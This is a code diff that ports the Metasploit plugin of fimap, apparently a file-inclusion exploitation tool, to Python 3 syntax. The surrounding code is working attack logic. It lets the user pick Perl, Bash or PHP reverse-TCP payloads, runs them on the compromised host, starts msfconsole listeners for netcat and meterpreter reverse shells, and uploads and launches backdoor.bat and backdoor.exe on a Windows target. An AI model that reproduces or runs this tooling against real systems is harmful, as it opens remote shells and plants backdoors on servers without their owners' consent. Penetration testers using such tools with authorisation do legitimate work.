@@ -66,11 +66,11 @@ class msf(basePlugin):
 
 
     def msf_menu_unix(self,msfObj,lhost,lport,haxhelper):
-    	print "Available payloads:"
-    	print "1) Perl reverse tcp"
-    	print "2) Bash reverse tcp"
-    	print "3) PHP reverse tcp"
-    	result=raw_input("Choose your payload: ")
+    	print("Available payloads:")
+    	print("1) Perl reverse tcp")
+    	print("2) Bash reverse tcp")
+    	print("3) PHP reverse tcp")
+    	result=input("Choose your payload: ")
     	if int(result) == 1:
     		self.isShellCode=True
     		msfObj.linuxPerlReverseShell(lhost,lport)
@@ -80,7 +80,7 @@ class msf(basePlugin):
     		self.isShellCode=True
     		msfObj.linuxBashReverseShell(lhost,lport)
     		msfObj.createPayload()
-    		print "Warning: Fimap will hang and crash because this Bash payload will run in foreground"
+    		print("Warning: Fimap will hang and crash because this Bash payload will run in foreground")
     		return True
     	elif int(result)==3:
     		self.isShellCode=False
@@ -89,7 +89,7 @@ class msf(basePlugin):
     			msfObj.phpReverseShell(lhost,lport)
     			msfObj.createPayload()
     			msfObj.loadCustomPayload("<?php\n"+msfObj.getPayload()+"\n?>")
-    			print "Warning: Fimap will hang and crash because this PHP payload will run in foreground"
+    			print("Warning: Fimap will hang and crash because this PHP payload will run in foreground")
     			return True
     		else:
     			return False
@@ -98,9 +98,9 @@ class msf(basePlugin):
 
 
     def get_parameters(self):
-		self.lhost=raw_input("Please, introduce lhost: ")
+		self.lhost=input("Please, introduce lhost: ")
 		self.lhost=self.lhost.strip("\n")
-		self.lport=raw_input("Please, introduce lport: ")
+		self.lport=input("Please, introduce lport: ")
 		self.lport=self.lport.strip("\n")
 		self.password=getpass.getpass("Please, introduce the password for msfconsole: ")
 
@@ -110,13 +110,13 @@ class msf(basePlugin):
 		Listener.setLhost(self.lhost)
 		Listener.setLport(self.lport)
 		Listener.setPayload(payload)
-		print "Creating listener... "
+		print("Creating listener... ")
 		try:
 			Listener.login()
 			Listener.launchHandler()
-			print "Listener created: PAYLOAD:%s  LHOST:%s LPORT:%s " % (Listener.getPayload(),Listener.getLhost(),Listener.getLport())
-		except MsfXmlRpcListenerErr,err:
-		        print err
+			print("Listener created: PAYLOAD:%s  LHOST:%s LPORT:%s " % (Listener.getPayload(),Listener.getLhost(),Listener.getLport()))
+		except MsfXmlRpcListenerErr as err:
+		        print(err)
 	
         
     def plugin_callback_handler(self, callbackstring, haxhelper):
@@ -134,12 +134,12 @@ class msf(basePlugin):
 		self.get_parameters()
 
 		if not self.msf_menu_unix(msfObj,self.lhost,self.lport,haxhelper): 
-			print "Sorry, this is payload not supported in this architecture!"
+			print("Sorry, this is payload not supported in this architecture!")
 			return 0
 		
 		self.set_listener("cmd/unix/reverse_netcat")
 		
-		print "Executing your payload ... "
+		print("Executing your payload ... ")
 		if self.isShellCode:
 			haxhelper.executeSystemCommand(msfObj.getPayload())
 		else: haxhelper.executeCode(msfObj.getPayload())
@@ -162,9 +162,9 @@ class msf(basePlugin):
             	dest = tmpDir+"\\backdoor.bat"
             	bytes = haxhelper.uploadfile(tmpPayload, dest, -1)
 		os.remove(tmpPayload)
-            	print "%d bytes written to '%s'." %(bytes, dest)
+            	print("%d bytes written to '%s'." %(bytes, dest))
 		self.set_listener("windows/meterpreter/reverse_tcp")
-            	print "Launching now..."
+            	print("Launching now...")
             	command = haxhelper.concatCommands(("cd "+tmpDir, dest))
             	haxhelper.executeSystemCommand(command)
             	haxhelper.executeSystemCommand(tmpDir+"\\backdoor.exe")
